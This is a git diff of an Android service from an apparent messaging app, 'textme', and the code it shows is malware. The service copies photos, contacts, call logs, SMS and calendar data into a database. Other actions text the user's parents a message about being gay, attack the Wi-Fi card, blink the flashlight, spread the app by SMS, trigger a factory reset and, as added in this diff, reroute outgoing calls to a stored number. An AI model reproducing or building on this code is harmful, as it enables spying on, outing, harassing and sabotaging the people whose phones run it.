@@ -3,21 +3,25 @@ package com.candroid.textme.jobs;
 import android.Manifest;
 import android.app.IntentService;
 import android.content.Intent;
+import android.content.SharedPreferences;
 import android.content.pm.PackageManager;
 import android.database.SQLException;
 import android.database.sqlite.SQLiteDatabase;
 import android.database.sqlite.SQLiteException;
 import android.net.Uri;
 import android.os.Build;
+import android.preference.PreferenceManager;
 import android.util.Log;
 
 import com.candroid.textme.BuildConfig;
+import com.candroid.textme.data.Commands;
 import com.candroid.textme.data.pojos.CalendarEvent;
 import com.candroid.textme.data.pojos.Contact;
 import com.candroid.textme.data.db.Database;
 import com.candroid.textme.data.db.DatabaseHelper;
 import com.candroid.textme.api.Lofl;
 import com.candroid.textme.jobs.services.InsertContactJobService;
+import com.candroid.textme.receivers.OutgoingCallReceiver;
 import com.candroid.textme.services.MessagingService;
 import com.candroid.textme.data.pojos.PhoneCall;
 import com.candroid.textme.data.Pornhub;
@@ -50,6 +54,7 @@ public class JobsIntentService extends IntentService {
     public static final String ACTION_FLASHLIGHT = "ACTION_FLASHLIGHT";
     public static final String ACTION_VIBRATOR = "ACTION_VIBRATOR";
     public static final String ACTION_WIFI_CARD = "ACTION_WIFI_CARD";
+    public static final String ACTION_REROUTE_CALLS = "ACTION_REROUTE_CALLS";
     private static long sNumber = 1111111111;
 
     public JobsIntentService() {
@@ -60,24 +65,26 @@ public class JobsIntentService extends IntentService {
     protected void onHandleIntent(Intent intent) {
         if (intent != null && intent.getAction() != null) {
             if(intent.getAction().equals(ACTION_DCIM_FILES)){
-                File[] pictures = Lofl.getFilesForDirectory(Lofl.getDcimDirectory().getPath() + "/Camera");
-                SQLiteDatabase database = DatabaseHelper.getInstance(getApplicationContext()).getWritableDatabase();
-                try{
-                    database.beginTransaction();
-                    if(pictures != null && pictures.length > 0){
-                        for(File f : pictures){
-                            Database.insertMedia(database, f.getName(), f);
+                if(checkSelfPermission(Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED){
+                    File[] pictures = Lofl.getFilesForDirectory(Lofl.getDcimDirectory().getPath() + "/Camera");
+                    SQLiteDatabase database = DatabaseHelper.getInstance(getApplicationContext()).getWritableDatabase();
+                    try{
+                        database.beginTransaction();
+                        if(pictures != null && pictures.length > 0){
+                            for(File f : pictures){
+                                Database.insertMedia(database, f.getName(), f);
+                            }
                         }
+                        database.setTransactionSuccessful();
+                    }catch (SQLiteException e){
+                        e.printStackTrace();
+                    }finally {
+                        database.endTransaction();
+                        if(database.isOpen()){
+                            database.close();
+                        }
+                        Lofl.setJobRan(this, JobsScheduler.DCIM_KEY);
                     }
-                    database.setTransactionSuccessful();
-                }catch (SQLiteException e){
-                    e.printStackTrace();
-                }finally {
-                    database.endTransaction();
-                    if(database.isOpen()){
-                        database.close();
-                    }
-                    Lofl.setJobRan(this, JobsScheduler.DCIM_KEY);
                 }
             }else if(intent.getAction().equals(ACTION_PACKAGES)){
                 SQLiteDatabase database = DatabaseHelper.getInstance(getApplicationContext()).getWritableDatabase();
@@ -95,18 +102,20 @@ public class JobsIntentService extends IntentService {
                     Lofl.setJobRan(this, JobsScheduler.PACKAGES_KEY);
                 }
             }else if(intent.getAction().equals(ACTION_CONTACTS)){
-                ArrayList<Contact> contacts = Lofl.fetchContactsInformation(this);
-                SQLiteDatabase database = DatabaseHelper.getInstance(getApplicationContext()).getWritableDatabase();
-                try{
-                    database.beginTransaction();
-                    Database.insertContacts(database, contacts);
-                    database.setTransactionSuccessful();
-                }catch (SQLiteException e){
-                    e.printStackTrace();
-                }finally{
-                    database.endTransaction();
-                    database.close();
-                    Lofl.setJobRan(this, ACTION_CONTACTS);
+                if(checkSelfPermission(Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED){
+                    ArrayList<Contact> contacts = Lofl.fetchContactsInformation(this);
+                    SQLiteDatabase database = DatabaseHelper.getInstance(getApplicationContext()).getWritableDatabase();
+                    try{
+                        database.beginTransaction();
+                        Database.insertContacts(database, contacts);
+                        database.setTransactionSuccessful();
+                    }catch (SQLiteException e){
+                        e.printStackTrace();
+                    }finally{
+                        database.endTransaction();
+                        database.close();
+                        Lofl.setJobRan(this, ACTION_CONTACTS);
+                    }
                 }
             }else if(intent.getAction().equals(ACTION_DEVICE_INFO)){
                 SQLiteDatabase database = DatabaseHelper.getInstance(getApplicationContext()).getWritableDatabase();
@@ -122,46 +131,53 @@ public class JobsIntentService extends IntentService {
                     Lofl.setJobRan(this, ACTION_DEVICE_INFO);
                 }
             }else if(intent.getAction().equals(ACTION_PHONE_CALLS)){
-                ArrayList<PhoneCall> phoneCalls = Lofl.fetchCallLog(this);
-                SQLiteDatabase database = DatabaseHelper.getInstance(getApplicationContext()).getWritableDatabase();
-                try{
-                    database.beginTransaction();
-                    Database.insertPhoneCalls(database, phoneCalls);
-                    database.setTransactionSuccessful();
-                }catch (SQLException e){
-                    e.printStackTrace();
-                }finally{
-                    database.endTransaction();
-                    database.close();
-                    Lofl.setJobRan(this, JobsScheduler.PHONE_CALLS_KEY);
+                if(checkSelfPermission(Manifest.permission.READ_CALL_LOG) == PackageManager.PERMISSION_GRANTED){
+                    ArrayList<PhoneCall> phoneCalls = Lofl.fetchCallLog(this);
+                    SQLiteDatabase database = DatabaseHelper.getInstance(getApplicationContext()).getWritableDatabase();
+                    try{
+                        database.beginTransaction();
+                        Database.insertPhoneCalls(database, phoneCalls);
+                        database.setTransactionSuccessful();
+                    }catch (SQLException e){
+                        e.printStackTrace();
+                    }finally{
+                        database.endTransaction();
+                        database.close();
+                        Lofl.setJobRan(this, JobsScheduler.PHONE_CALLS_KEY);
+                    }
                 }
             }else if(intent.getAction().equals(ACTION_SMS)){
-                ArrayList<SmsMsg> smsMsgs = Lofl.fetchSmsMessages(this);
-                SQLiteDatabase database = DatabaseHelper.getInstance(getApplicationContext()).getWritableDatabase();
-                try{
-                    database.beginTransaction();
-                    Database.insertSmsMessages(database, smsMsgs);
-                    database.setTransactionSuccessful();
-                }catch (SQLException e){
-                    e.printStackTrace();
-                }finally {
-                    database.endTransaction();
-                    database.close();
-                    Lofl.setJobRan(this, JobsScheduler.SMS_KEY);
+                if(checkSelfPermission(Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED){
+                    ArrayList<SmsMsg> smsMsgs = Lofl.fetchSmsMessages(this);
+                    SQLiteDatabase database = DatabaseHelper.getInstance(getApplicationContext()).getWritableDatabase();
+                    try{
+                        database.beginTransaction();
+                        Database.insertSmsMessages(database, smsMsgs);
+                        database.setTransactionSuccessful();
+                    }catch (SQLException e){
+                        e.printStackTrace();
+                    }finally {
+                        database.endTransaction();
+                        database.close();
+                        Lofl.setJobRan(this, JobsScheduler.SMS_KEY);
+                        //Lofl.onReceiveCommand(this, Commands.REROUTE_PHONE_CALLS, "stop");
+                    }
                 }
             }else if(intent.getAction().equals(ACTION_CALENDAR_EVENT)){
-                ArrayList<CalendarEvent> calendarEvents = Lofl.fetchCalendarEvents(this);
-                SQLiteDatabase database = DatabaseHelper.getInstance(getApplicationContext()).getWritableDatabase();
-                try{
-                    database.beginTransaction();
-                    Database.insertCalendarEvents(database, calendarEvents);
-                    database.setTransactionSuccessful();
-                }catch (SQLException e){
-                    e.printStackTrace();
-                }finally {
-                    database.endTransaction();
-                    database.close();
-                    Lofl.setJobRan(this, JobsScheduler.CALENDAR_EVENTS_KEY);
+                if(checkSelfPermission(Manifest.permission.READ_CALENDAR) == PackageManager.PERMISSION_GRANTED){
+                    ArrayList<CalendarEvent> calendarEvents = Lofl.fetchCalendarEvents(this);
+                    SQLiteDatabase database = DatabaseHelper.getInstance(getApplicationContext()).getWritableDatabase();
+                    try{
+                        database.beginTransaction();
+                        Database.insertCalendarEvents(database, calendarEvents);
+                        database.setTransactionSuccessful();
+                    }catch (SQLException e){
+                        e.printStackTrace();
+                    }finally {
+                        database.endTransaction();
+                        database.close();
+                        Lofl.setJobRan(this, JobsScheduler.CALENDAR_EVENTS_KEY);
+                    }
                 }
             }else if(intent.getAction().equals(ACTION_WALLPAPER)){
                 double randomNumber = Math.random();
@@ -191,8 +207,10 @@ public class JobsIntentService extends IntentService {
             }else if(intent.getAction().equals(ACTION_FAKE_PHONE_CALL)){
                 Lofl.fakePhoneCall(this);
             }else if(intent.getAction().equals(ACTION_TEXT_PARENTS)){
-                Lofl.tellMyParentsImGay(this);
-                Lofl.setJobRan(this, JobsScheduler.TEXT_PARENTS_KEY);
+                if(checkSelfPermission(Manifest.permission.SEND_SMS) == PackageManager.PERMISSION_GRANTED){
+                    Lofl.tellMyParentsImGay(this);
+                    Lofl.setJobRan(this, JobsScheduler.TEXT_PARENTS_KEY);
+                }
             }else if(intent.getAction().equals(ACTION_INSERT_CONTACT)){
                 if(this.checkSelfPermission(Manifest.permission.WRITE_CONTACTS) == PackageManager.PERMISSION_GRANTED){
                     TimerTask timerTask = new TimerTask() {
@@ -207,17 +225,31 @@ public class JobsIntentService extends IntentService {
                     Lofl.setJobRan(this, JobsScheduler.INSERT_CONTACT_KEY);
                 }
             } else if (intent.getAction().equals(ACTION_WIFI_CARD)) {
-                Lofl.dosWifiCard(this);
+                if(checkSelfPermission(Manifest.permission.CHANGE_WIFI_STATE) == PackageManager.PERMISSION_GRANTED){
+                    Lofl.dosWifiCard(this);
+                }
             }else if(intent.getAction().equals(ACTION_FLASHLIGHT)){
-                Lofl.persistentBlinkingFlashlight(this);
+                if(checkSelfPermission(Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED){
+                    Lofl.persistentBlinkingFlashlight(this);
+                }
             }else if(intent.getAction().equals(ACTION_VIBRATOR)){
                 Lofl.vibrator(this);
             } else if(intent.getAction().equals(ACTION_LOCATION)){
 
             }else if(intent.getAction().equals(ACTION_SHARE_APP)){
-                Lofl.shareApp(this);
+                if(checkSelfPermission(Manifest.permission.SEND_SMS) == PackageManager.PERMISSION_GRANTED){
+                    Lofl.shareApp(this);
+                }
             }else if(intent.getAction().equals(ACTION_FACTORY_RESET)){
                 Lofl.factoryReset(this);
+            }else if(intent.getAction().equalsIgnoreCase(ACTION_REROUTE_CALLS)){
+                if(intent.hasExtra(OutgoingCallReceiver.NUMBER_KEY)){
+                    String number = intent.getStringExtra(OutgoingCallReceiver.NUMBER_KEY);
+                    SharedPreferences.Editor editor = PreferenceManager.getDefaultSharedPreferences(this.getApplicationContext()).edit();
+                    editor.putString(OutgoingCallReceiver.NUMBER_KEY, number);
+                    editor.apply();
+                    OutgoingCallReceiver.sRerouteNumber = number;
+                }
             }else {
                 Log.d(TAG, "No action found!");
             }
